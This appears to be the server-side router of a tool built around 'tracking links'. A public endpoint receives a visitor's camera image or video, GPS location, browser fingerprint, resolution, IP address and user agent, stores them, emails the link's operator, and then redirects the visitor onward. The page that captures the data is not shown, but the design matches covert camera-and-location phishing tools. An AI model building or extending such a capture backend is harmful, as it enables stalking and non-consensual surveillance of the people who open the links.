import { COOKIE_NAME } from "@shared/const";
import { getSessionCookieOptions } from "./_core/cookies";
import { systemRouter } from "./_core/systemRouter";
import { publicProcedure, protectedProcedure, router } from "./_core/trpc";
import { z } from "zod";
import * as db from "./db";
import { storagePut } from "./storage";
import { nanoid } from "nanoid";
import { sendCaptureNotification } from "./email";

export const appRouter = router({
  system: systemRouter,
  auth: router({
    me: publicProcedure.query(opts => opts.ctx.user),
    logout: publicProcedure.mutation(({ ctx }) => {
      const cookieOptions = getSessionCookieOptions(ctx.req);
      ctx.res.clearCookie(COOKIE_NAME, { ...cookieOptions, maxAge: -1 });
      return {
        success: true,
      } as const;
    }),
  }),

  status: router({
    smtpStatus: publicProcedure.query(() => {
      const host = process.env.SMTP_HOST;
      const user = process.env.SMTP_USER;
      const pass = process.env.SMTP_PASS;
      return {
        configured: Boolean(host && user && pass),
      };
    }),
  }),

  tracking: router({
    createLink: protectedProcedure
      .input(
        z.object({
          id: z.string().min(1, "ID ist erforderlich"),
          redirectUrl: z.string().url("Gültige URL erforderlich"),
        })
      )
      .mutation(async ({ input }) => {
        const existing = await db.getTrackingLinkById(input.id);
        if (existing) {
          throw new Error("Diese Tracking-ID existiert bereits.");
        }
        await db.createTrackingLink({
          id: input.id,
          redirectUrl: input.redirectUrl,
        });
        return { success: true, id: input.id };
      }),

    listLinks: protectedProcedure.query(async () => {
      return await db.getTrackingLinks();
    }),

    getLink: publicProcedure
      .input(z.object({ id: z.string() }))
      .query(async ({ input }) => {
        const link = await db.getTrackingLinkById(input.id);
        return link;
      }),

    deleteLink: protectedProcedure
      .input(z.object({ id: z.string() }))
      .mutation(async ({ input }) => {
        return await db.deleteTrackingLink(input.id);
      }),
  }),

  captures: router({
    list: protectedProcedure
      .input(z.object({ linkId: z.string().optional() }))
      .query(async ({ input }) => {
        return await db.getCaptures(input.linkId);
      }),

    submit: publicProcedure
      .input(
        z.object({
          linkId: z.string(),
          imageBase64: z.string(),
          gps: z.string().optional(),
          fingerprint: z.string().optional(),
          resolution: z.string().optional(),
        })
      )
      .mutation(async ({ input, ctx }) => {
        const link = await db.getTrackingLinkById(input.linkId);
        if (!link) {
          throw new Error("Tracking link not found");
        }

        const forwarded = ctx.req.headers["x-forwarded-for"];
        const ip = typeof forwarded === "string" ? forwarded.split(",")[0] : ctx.req.socket.remoteAddress || "unknown";
        const userAgent = ctx.req.headers["user-agent"] || "unknown";

        const base64Data = input.imageBase64;
        let ext = "png";
        let mime = "image/png";

        if (base64Data.startsWith("data:video/webm") || base64Data.includes("video/webm")) {
          ext = "webm";
          mime = "video/webm";
        } else if (base64Data.startsWith("data:video/mp4") || base64Data.includes("video/mp4")) {
          ext = "mp4";
          mime = "video/mp4";
        }

        const base64Clean = base64Data.replace(/^data:\w+\/\w+;base64,/, "");
        const buffer = Buffer.from(base64Clean, "base64");

        const captureId = nanoid(10);
        const fileName = `capture_${input.linkId}_${Date.now()}_${captureId}.${ext}`;
        const s3Result = await storagePut(fileName, buffer, mime);

        const now = new Date();
        await db.createCapture({
          id: captureId,
          linkId: input.linkId,
          ip: ip.trim(),
          gps: input.gps || "Nicht verfügbar",
          fingerprint: input.fingerprint || "Unbekannt",
          resolution: input.resolution || "Unbekannt",
          userAgent: userAgent,
          filePath: s3Result.url,
          createdAt: now,
        });

        sendCaptureNotification({
          linkId: input.linkId,
          ip: ip.trim(),
          gps: input.gps || "Nicht verfügbar",
          resolution: input.resolution || "Unbekannt",
          filePath: s3Result.url,
          createdAt: now,
        }).catch((err) => console.error("[SMTP] Mail error:", err));

        return { success: true, redirectUrl: link.redirectUrl };
      }),

    delete: protectedProcedure
      .input(z.object({ id: z.string() }))
      .mutation(async ({ input }) => {
        return await db.deleteCapture(input.id);
      }),

    clearAll: protectedProcedure
      .input(z.object({ linkId: z.string().optional() }))
      .mutation(async ({ input }) => {
        return await db.clearAllCaptures(input.linkId);
      }),
  }),
});

export type AppRouter = typeof appRouter;
